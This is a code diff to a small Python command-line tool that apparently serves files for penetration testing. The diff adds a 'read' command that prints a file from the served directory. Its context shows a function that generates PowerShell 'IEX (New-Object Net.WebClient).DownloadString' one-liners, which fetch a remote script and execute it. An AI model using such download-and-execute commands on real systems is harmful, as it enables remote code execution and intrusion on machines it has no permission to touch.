@@ -1,5 +1,5 @@
 from lib import logger, arguments
-import os
+import os, mimetypes
 from shutil import copy
 
 args = arguments.get_args()
@@ -16,6 +16,11 @@ def do(cmd):
 		if cmd.startswith('generate '):
 			cmd = cmd.split(' ')[1]
 			generate_command(cmd)
+
+	if 'read' in cmd:
+		if cmd.startswith('read '):
+			cmd = cmd.split(' ')[1]
+			read_file(cmd)
 
 	if 'add' in cmd:
 		if cmd.startswith('add '):
@@ -53,6 +58,21 @@ def generate_command(cmd):
 			commands.append(f'powershell.exe -c IEX (New-Object Net.WebClient).DownloadString({url}{f})')
 
 	logger.list_commands(commands)
+
+
+def read_file(cmd):
+	if args.directory.endswith('/'):
+		file_to_read = args.directory + cmd
+	else:
+		file_to_read = args.directory + '/' + cmd
+
+	try:
+		with open(file_to_read,'r') as f:
+			logger.msg('Contents of ',file_to_read+':','green')
+			print(f.read())
+	except UnicodeDecodeError as e:
+		logger.msg('Unable to read ',file_to_read,'red')
+		return 1
 
 def add_file(cmd):
 	from_location = cmd
